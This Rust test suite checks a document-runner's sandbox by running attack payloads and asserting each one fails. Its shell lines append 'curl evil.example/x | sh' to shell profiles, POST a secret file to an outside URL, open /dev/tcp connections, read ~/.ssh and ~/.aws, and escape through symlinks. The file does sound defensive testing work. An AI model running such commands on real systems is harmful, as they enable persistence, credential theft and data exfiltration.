//! The sandbox, attacked.
//!
//! Every test here is a real payload written the way an attacker would write it, run through
//! the real `run_document` — the same path `dx run` and the `dx_run` tool take. Each one
//! asserts the attack **failed**, and where the attack leaves a trace (a file that should not
//! exist), it checks the trace is absent rather than trusting the exit code.
//!
//! This file is the evidence for the claim `doc-run::confine` makes. A change that weakens
//! the boundary is meant to be discovered here, loudly, rather than in a document someone
//! was handed.
//!
//! Three things are deliberately *not* asserted, because they are true by design:
//!
//! - **Reading is allowed.** A block is supposed to open the data next to the document.
//! - **The block's own directory is writable.** It is where a block builds what it needs.
//! - **Dependency installation reaches the network.** `npm` cannot work without it. It is
//!   confined in every other way, which `setup_cannot_write_outside_the_directories_it_was_granted`
//!   in `workdir` pins down.

use std::fs;
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::time::Duration;

use doc_core::resolve::Nowhere;
use doc_run::{run_document, RunOptions};

/// Guards every call into [`confine`](doc_run::confine) made by this file's tests.
///
/// `cargo test` runs this file's tests on several threads at once, and [`confine::confine`]
/// reads the process-global `DX_UNCONFINED` variable. The one test that toggles it
/// (`dx_unconfined_actually_removes_the_boundary`) has to hold this lock across the toggle and
/// the run it covers, or an unrelated attack on another thread could observe the boundary
/// turned off mid-run and fail for a reason that has nothing to do with what it tests.
static SANDBOX_LOCK: Mutex<()> = Mutex::new(());

/// A scratch document directory, its cache, and a clean slate each time.
fn scene(label: &str) -> (PathBuf, RunOptions) {
    let root = std::env::temp_dir().join(format!("dx-attack-{label}"));
    let _ = fs::remove_dir_all(&root);
    fs::create_dir_all(&root).expect("scene");
    let options = RunOptions {
        document_dir: root.clone(),
        cache_root: root.join("cache"),
        default_timeout: Duration::from_secs(30),
        // Approved on purpose: these payloads must actually execute — a payload the
        // review gate refused would leave every assertion green without testing the
        // sandbox at all.
        approve: true,
        ..RunOptions::default()
    };
    (root, options)
}

/// Run one shell block and hand back what it printed.
fn attack(code: &str, options: &RunOptions) -> String {
    let _guard = SANDBOX_LOCK
        .lock()
        .unwrap_or_else(|poison| poison.into_inner());
    attack_unlocked(code, options)
}

/// [`attack`]'s body, for a caller that already holds [`SANDBOX_LOCK`] itself — taking the
/// lock twice on one thread would deadlock, since [`Mutex`] here is not reentrant.
fn attack_unlocked(code: &str, options: &RunOptions) -> String {
    let source = format!("::code id=payload lang=bash run\n{code}\n::end\n");
    let report = run_document(&source, options, &Nowhere).expect("acyclic run");
    report
        .runs
        .first()
        .map(|run| run.output.clone())
        .unwrap_or_default()
}

/// Whether this machine imposes a boundary at all. Without one there is nothing to test,
/// and a green suite would be a lie rather than a pass.
fn confined() -> bool {
    !doc_run::confine::overridden() && (cfg!(target_os = "macos") || cfg!(target_os = "linux"))
}

/// The file a payload tried to create, which must not be there afterwards.
fn assert_absent(path: &Path, what: &str) {
    assert!(
        !path.exists(),
        "{what}: the sandbox let a document create {}",
        path.display()
    );
}

#[test]
fn a_block_cannot_write_into_the_directory_its_document_lives_in() {
    if !confined() {
        return;
    }
    let (root, options) = scene("write-beside");
    let target = root.join("planted.txt");
    let output = attack(&format!("echo pwned > {}", target.display()), &options);
    assert_absent(&target, "a write beside the document");
    assert!(
        output.contains("not permitted") || output.contains("denied") || output.contains("error"),
        "the failure was silent: {output}"
    );
}

#[test]
fn a_block_cannot_overwrite_a_file_that_was_already_there() {
    if !confined() {
        return;
    }
    let (root, options) = scene("overwrite");
    let precious = root.join("data.csv");
    fs::write(&precious, "the original").expect("fixture");

    // Reading it is allowed and is the whole point; replacing it is not.
    let read_back = attack(&format!("cat {}", precious.display()), &options);
    assert_eq!(
        read_back, "the original",
        "a block must still read its data"
    );

    attack(
        &format!("echo destroyed > {}", precious.display()),
        &options,
    );
    attack(&format!("rm -f {}", precious.display()), &options);
    assert_eq!(
        fs::read_to_string(&precious).expect("still there"),
        "the original",
        "a document rewrote the file next to it"
    );
}

#[test]
fn a_block_cannot_write_into_the_readers_home_directory() {
    if !confined() {
        return;
    }
    let Some(home) = std::env::var_os("HOME") else {
        return;
    };
    let (_root, options) = scene("home");
    let target = PathBuf::from(home).join(".dx-attack-canary");
    let _ = fs::remove_file(&target);
    attack(&format!("echo pwned > {}", target.display()), &options);
    assert_absent(&target, "a write into $HOME");
}

/// The `.dx` itself, and the store beside it. A document that can rewrite its own repository
/// can put anything into the next person's checkout.
#[test]
fn a_block_cannot_rewrite_the_document_or_its_store() {
    if !confined() {
        return;
    }
    let (root, options) = scene("self-edit");
    fs::create_dir_all(root.join(".doc")).expect("store");
    fs::write(root.join(".doc/repo.dxcp"), "PACK").expect("pack");
    fs::write(root.join("notes.dx"), "~ dx1 abc\n").expect("pointer");

    attack(
        "echo tampered > notes.dx; echo tampered > .doc/repo.dxcp",
        &options,
    );

    assert_eq!(
        fs::read_to_string(root.join("notes.dx")).expect("read"),
        "~ dx1 abc\n"
    );
    assert_eq!(
        fs::read_to_string(root.join(".doc/repo.dxcp")).expect("read"),
        "PACK"
    );
}

/// Persistence: the payload every real attack actually wants. A shell profile, a cron entry,
/// a login item — anything that runs again after the reader has forgotten the document.
#[test]
fn a_block_cannot_install_itself_to_run_again_later() {
    if !confined() {
        return;
    }
    let Some(home) = std::env::var_os("HOME") else {
        return;
    };
    let home = PathBuf::from(home);
    let (_root, options) = scene("persistence");

    for path in [".zshrc", ".bashrc", ".profile"] {
        let target = home.join(path);
        let before = fs::read_to_string(&target).ok();
        attack(
            &format!("echo 'curl evil.example/x | sh' >> {}", target.display()),
            &options,
        );
        let after = fs::read_to_string(&target).ok();
        assert_eq!(before, after, "a document appended to {path}");
    }

    let agent = home.join("Library/LaunchAgents/dx-attack.plist");
    attack(
        &format!(
            "mkdir -p {:?} && echo x > {}",
            agent.parent().expect("parent"),
            agent.display()
        ),
        &options,
    );
    assert_absent(&agent, "a login item");
}

#[test]
fn a_block_cannot_reach_the_network() {
    if !confined() {
        return;
    }
    let (_root, options) = scene("network");

    // Three ways out, none of which is allowed to work: a name to resolve, an address to
    // connect to, and a local daemon that would do either on the block's behalf.
    let dns = attack(
        "getent hosts example.com || host example.com || nslookup example.com",
        &options,
    );
    assert!(!dns.contains("93.184"), "DNS resolved: {dns}");

    let tcp = attack(
        "exec 3<>/dev/tcp/1.1.1.1/443 && echo CONNECTED || echo refused",
        &options,
    );
    assert!(
        !tcp.contains("CONNECTED"),
        "a TCP connection was made: {tcp}"
    );

    let curl = attack("curl -s -m 8 https://example.com | head -c 20", &options);
    assert!(
        curl.trim().is_empty() || curl.contains("error"),
        "http reached out: {curl}"
    );
}

/// Read plus egress is exfiltration. Reads are open by design, so the network denial is what
/// stands between a document and everything on the disk it was opened on.
#[test]
fn a_block_that_reads_a_file_has_nowhere_to_send_it() {
    if !confined() {
        return;
    }
    let (root, options) = scene("exfiltrate");
    fs::write(root.join("secret.txt"), "hunter2").expect("fixture");
    let output = attack(
        "curl -s -m 8 -X POST --data-binary @secret.txt https://example.com/collect && echo SENT",
        &options,
    );
    assert!(!output.contains("SENT"), "the file was uploaded: {output}");
}

/// Reads are scoped to the repository the document lives in: the rest of the machine —
/// here, the temp tree beside the scene — is dark. The project is a block's whole world.
#[test]
fn a_block_cannot_read_outside_the_repository_its_document_lives_in() {
    if !confined() {
        return;
    }
    let (root, options) = scene("read-outside");
    // Inside the scope: a file beside the document reads normally — that is what a block
    // is *for* — so a failure below is the boundary, not a broken interpreter.
    fs::write(root.join("beside.txt"), "the project's own data").expect("fixture");
    let inside = attack("cat beside.txt", &options);
    assert!(
        inside.contains("the project's own data"),
        "the project itself must stay readable: {inside}"
    );

    // Outside it: the document's folder carries no repository marker, so it is its own
    // scope, and its parent — by the same rule, the rest of the machine — is not in it.
    let canary = root
        .parent()
        .expect("temp parent")
        .join("dx-attack-outside-canary.txt");
    fs::write(&canary, "CANARY-b7e1 beyond the boundary").expect("canary");
    let output = attack(&format!("cat {}", canary.display()), &options);
    let _ = fs::remove_file(&canary);
    assert!(
        !output.contains("CANARY-b7e1"),
        "a block read outside its repository: {output}"
    );
}

/// A repository marker widens the scope to the repository, never past it: a document deep
/// in a project reads the whole project, and still nothing beside the project.
#[test]
fn a_repositorys_document_reads_the_repository_and_nothing_above_it() {
    if !confined() {
        return;
    }
    let (root, mut options) = scene("read-repo-scope");
    let docs = root.join("repo/docs");
    fs::create_dir_all(root.join("repo/.git")).expect("marker");
    fs::create_dir_all(&docs).expect("tree");
    fs::write(root.join("repo/data.txt"), "the whole project").expect("fixture");
    fs::write(root.join("outside.txt"), "beside the project").expect("canary");
    options.document_dir = docs;

    let up_one = attack("cat ../data.txt", &options);
    assert!(
        up_one.contains("the whole project"),
        "the repository is the scope, not the document's folder: {up_one}"
    );
    let past = attack("cat ../../outside.txt", &options);
    assert!(
        !past.contains("beside the project"),
        "a block read past its repository's root: {past}"
    );
}

/// A `git worktree` checkout is its own directory but the same repository. A document run
/// from one must still be able to read a file that lives only in a sibling checkout of that
/// same repository — the live state a gate wants was never "the rest of the machine" just
/// because it happens to sit in whichever checkout `dx` was not invoked from this time.
#[test]
fn a_worktree_reads_a_file_that_lives_only_in_its_sibling_checkout() {
    if !confined() {
        return;
    }
    let git = |dir: &Path, args: &[&str]| {
        std::process::Command::new("git")
            .arg("-C")
            .arg(dir)
            .args(args)
            .output()
            .is_ok_and(|out| out.status.success())
    };

    let scratch = std::env::temp_dir().join("dx-attack-worktree-scope");
    let _ = fs::remove_dir_all(&scratch);
    let main = scratch.join("main");
    fs::create_dir_all(&main).expect("main checkout");
    if !git(&main, &["init", "-q", "-b", "main"]) {
        return; // No git on this machine; nothing to assert.
    }
    git(&main, &["config", "user.email", "t@example.com"]);
    git(&main, &["config", "user.name", "t"]);
    fs::write(main.join("seed.dx"), "::paragraph id=p\nx\n::end\n").expect("write");
    git(&main, &["add", "-A"]);
    git(&main, &["commit", "-qm", "one"]);

    // Live state that exists only in the main checkout — never copied into the worktree —
    // the same shape as `.sara/config.json` living only in the checkout a worktree branched
    // from, not duplicated into every worktree.
    fs::write(
        main.join("live-state.json"),
        "the main checkout's live state",
    )
    .expect("state");

    let side = scratch.join("side");
    assert!(git(
        &main,
        &[
            "worktree",
            "add",
            "-q",
            "-b",
            "side",
            &side.to_string_lossy()
        ],
    ));

    let mut options = RunOptions {
        document_dir: side.clone(),
        cache_root: scratch.join("cache"),
        default_timeout: Duration::from_secs(30),
        approve: true,
        ..RunOptions::default()
    };
    let output = attack(
        &format!("cat {}", main.join("live-state.json").display()),
        &options,
    );
    assert!(
        output.contains("the main checkout's live state"),
        "a worktree could not read its sibling checkout of the same repository: {output}"
    );

    // The boundary is still real: an unrelated directory beside the whole scratch tree — no
    // relation to this repository at all — must stay dark from the worktree exactly as it
    // would from any other checkout.
    let canary = scratch
        .parent()
        .expect("temp parent")
        .join("dx-attack-worktree-scope-canary.txt");
    fs::write(&canary, "CANARY-9f21 beyond the repository").expect("canary");
    options.document_dir = side;
    let leaked = attack(&format!("cat {}", canary.display()), &options);
    let _ = fs::remove_file(&canary);
    assert!(
        !leaked.contains("CANARY-9f21"),
        "a worktree read a directory unrelated to its repository: {leaked}"
    );
}

/// Credentials are the exception inside the readable scope: these are denied outright, so
/// a document cannot even put a key on the page for a shoulder to read over.
#[test]
fn a_block_cannot_read_the_credential_stores() {
    if !confined() {
        return;
    }
    let Some(home) = std::env::var_os("HOME") else {
        return;
    };
    let home = PathBuf::from(home);
    let (_root, options) = scene("credentials");

    for store in [".ssh", ".aws", ".gnupg"] {
        let path = home.join(store);
        if !path.exists() {
            continue;
        }
        let output = attack(
            &format!("cat {}/* 2>&1 | head -c 200", path.display()),
            &options,
        );
        assert!(
            !output.contains("PRIVATE KEY") && !output.contains("aws_secret_access_key"),
            "a document read {store}: {output}"
        );
    }
}

/// The environment is a credential store too, and the most commonly full one.
#[test]
fn a_block_does_not_inherit_the_shell_it_was_started_from() {
    if !confined() {
        return;
    }
    let (_root, options) = scene("environment");
    std::env::set_var("DX_ATTACK_FAKE_TOKEN", "ghp_averyrealtoken");
    let output = attack("env | grep -c DX_ATTACK_FAKE_TOKEN || true", &options);
    std::env::remove_var("DX_ATTACK_FAKE_TOKEN");
    assert!(
        output.trim() == "0" || output.trim().is_empty(),
        "the reader's environment leaked into the block: {output}"
    );
}

/// A symlink is the classic way around a path rule: point at something outside, then write
/// through the link from inside. The kernel resolves the path before it checks it.
#[test]
fn a_block_cannot_escape_through_a_symlink_it_planted() {
    if !confined() {
        return;
    }
    let (root, options) = scene("symlink");
    let target = root.join("linked-out.txt");
    let output = attack(
        &format!(
            "ln -sf {} \"$DX_SANDBOX/escape\" && echo pwned > \"$DX_SANDBOX/escape\" && echo WROTE",
            target.display()
        ),
        &options,
    );
    assert!(
        !output.contains("WROTE"),
        "the write through the link succeeded: {output}"
    );
    assert_absent(&target, "a write through a planted symlink");
}

/// A block that shells out gets no more than the block had. Seatbelt and bubblewrap are both
/// inherited across `exec`, and this is the test that says so out loud.
#[test]
fn a_child_process_is_inside_the_same_boundary() {
    if !confined() {
        return;
    }
    let (root, options) = scene("child");
    let target = root.join("via-child.txt");
    attack(
        &format!("bash -c 'bash -c \"echo pwned > {}\"'", target.display()),
        &options,
    );
    assert_absent(&target, "a write from a grandchild process");
}

/// A block that overruns its deadline is killed, and so is everything it left running.
///
/// The marker goes inside the block's own sandbox directory (`$DX_SANDBOX`) — the one place
/// a block *may* write — so that if the child survives the kill, the write succeeds and the
/// assertion catches it. A marker outside every writable grant would be blocked by the
/// sandbox itself, and the test could never fail.
#[test]
fn a_backgrounded_process_does_not_outlive_the_block_that_started_it() {
    if !confined() {
        return;
    }
    let (root, options) = scene("background");
    let source = "::code id=payload lang=bash run timeout=2\n\
         (sleep 20; echo alive > \"$DX_SANDBOX/still-alive\") &\n\
         sleep 30\n::end\n";
    let guard = SANDBOX_LOCK
        .lock()
        .unwrap_or_else(|poison| poison.into_inner());
    let report = run_document(source, &options, &Nowhere).expect("acyclic run");
    drop(guard);
    assert_eq!(report.runs[0].status, "error");
    assert!(report.runs[0].output.contains("timed out"));

    // If the child survived the kill, it writes the marker 20 seconds in. The sandbox
    // directory lives under the cache, at a fingerprinted path this test does not know, so
    // it looks for the marker by name.
    std::thread::sleep(Duration::from_secs(6));
    assert!(
        find_file(&root, "still-alive").is_none(),
        "a process outlived its block and wrote its marker"
    );
}

/// A `writes=` grant opens exactly the folders it names, and not one path more. The grant
/// is the sandbox's one door into the document's folder, so this test walks its edges: the
/// granted folder takes the write, the folder beside it refuses, the network stays gone,
/// and the store cannot be named at all.
#[test]
fn a_write_grant_opens_its_folder_and_nothing_beside_it() {
    if !confined() {
        return;
    }
    let (root, options) = scene("write-grant");
    let source = "::code id=payload lang=bash run writes=out\n\
         echo built > out/artifact.txt && echo GRANTED\n\
         echo pwned > beside.txt && echo ESCAPED\n::end\n";
    let guard = SANDBOX_LOCK
        .lock()
        .unwrap_or_else(|poison| poison.into_inner());
    let report = run_document(source, &options, &Nowhere).expect("acyclic run");
    drop(guard);
    let output = &report.runs[0].output;
    assert!(
        output.contains("GRANTED"),
        "the granted write failed: {output}"
    );
    assert!(
        !output.contains("ESCAPED"),
        "a write beside the grant succeeded: {output}"
    );
    assert_eq!(
        fs::read_to_string(root.join("out/artifact.txt")).expect("the artifact"),
        "built\n"
    );
    assert_absent(&root.join("beside.txt"), "a write outside the grant");
}

#[test]
fn a_write_grant_does_not_hand_back_the_network() {
    if !confined() {
        return;
    }
    let (_root, options) = scene("write-grant-network");
    let source = "::code id=payload lang=bash run writes=out\n\
         mkdir -p out\n\
         curl -s -m 8 https://example.com > out/loot.txt && echo FETCHED || echo offline\n::end\n";
    let guard = SANDBOX_LOCK
        .lock()
        .unwrap_or_else(|poison| poison.into_inner());
    let report = run_document(source, &options, &Nowhere).expect("acyclic run");
    drop(guard);
    assert!(
        !report.runs[0].output.contains("FETCHED"),
        "a granted block reached the network: {}",
        report.runs[0].output
    );
}

#[test]
fn a_write_grant_naming_the_store_is_refused_before_anything_runs() {
    if !confined() {
        return;
    }
    let (root, options) = scene("write-grant-store");
    fs::create_dir_all(root.join(".doc")).expect("store");
    fs::write(root.join(".doc/repo.dxcp"), "PACK").expect("pack");
    let source = "::code id=payload lang=bash run writes=.doc\n\
         echo tampered > .doc/repo.dxcp\n::end\n";
    let guard = SANDBOX_LOCK
        .lock()
        .unwrap_or_else(|poison| poison.into_inner());
    let report = run_document(source, &options, &Nowhere).expect("acyclic run");
    drop(guard);
    assert_eq!(report.runs[0].status, "blocked");
    assert!(
        report.runs[0].output.contains(".doc"),
        "{}",
        report.runs[0].output
    );
    assert_eq!(
        fs::read_to_string(root.join(".doc/repo.dxcp")).expect("read"),
        "PACK"
    );
}

/// The evidence that every `confined()` test above is actually proving something: the same
/// write-beside-the-document attack, run with the boundary turned off exactly the way
/// `DX_UNCONFINED=1` turns it off for a person, must **succeed** — the file must land. If it
/// does not, nothing above this line was ever stopped by Seatbelt or bubblewrap; it could have
/// failed for some unrelated reason (a missing binary, a shell quoting bug) and every assertion
/// would still read green. This is the negative control the rest of the file assumes.
#[test]
fn dx_unconfined_actually_removes_the_boundary() {
    if !confined() {
        // Nothing imposes a boundary here, so there is nothing whose absence to prove either.
        return;
    }
    let (root, options) = scene("unconfined-proof");
    let target = root.join("planted.txt");
    let _ = fs::remove_file(&target);

    let guard = SANDBOX_LOCK
        .lock()
        .unwrap_or_else(|poison| poison.into_inner());
    std::env::set_var("DX_UNCONFINED", "1");
    let output = attack_unlocked(&format!("echo pwned > {}", target.display()), &options);
    std::env::remove_var("DX_UNCONFINED");
    drop(guard);

    assert!(
        target.exists(),
        "DX_UNCONFINED did not remove the boundary — a write beside the document that every \
         other test in this file expects to fail did not happen here either: {output}. If \
         this fails, the confined() tests above are not proving the sandbox stops anything."
    );
    let _ = fs::remove_file(&target);
}

/// The first file named `name` anywhere under `root`, or `None`.
fn find_file(root: &Path, name: &str) -> Option<PathBuf> {
    for entry in fs::read_dir(root).ok()?.flatten() {
        let path = entry.path();
        if path.is_dir() {
            if let Some(found) = find_file(&path, name) {
                return Some(found);
            }
        } else if path.file_name().is_some_and(|file| file == name) {
            return Some(path);
        }
    }
    None
}

/// The one thing that must never be quiet: a machine that cannot confine code does not run
/// it, and says so in the document rather than running it anyway.
#[test]
fn a_machine_with_no_boundary_blocks_the_run_instead_of_widening_it() {
    let described = doc_run::confine::describe();
    if cfg!(target_os = "macos") {
        assert!(described == "seatbelt" || described.contains("DX_UNCONFINED"));
    } else if cfg!(target_os = "linux") {
        assert!(described == "bubblewrap" || described.contains("DX_UNCONFINED"));
    } else {
        // Nothing to impose a boundary with, so nothing may run.
        let (_root, options) = scene("no-boundary");
        let output = attack("echo ran", &options);
        assert!(
            !output.contains("ran"),
            "code ran with no sandbox: {output}"
        );
        assert!(output.contains("no sandbox"), "{output}");
    }
}
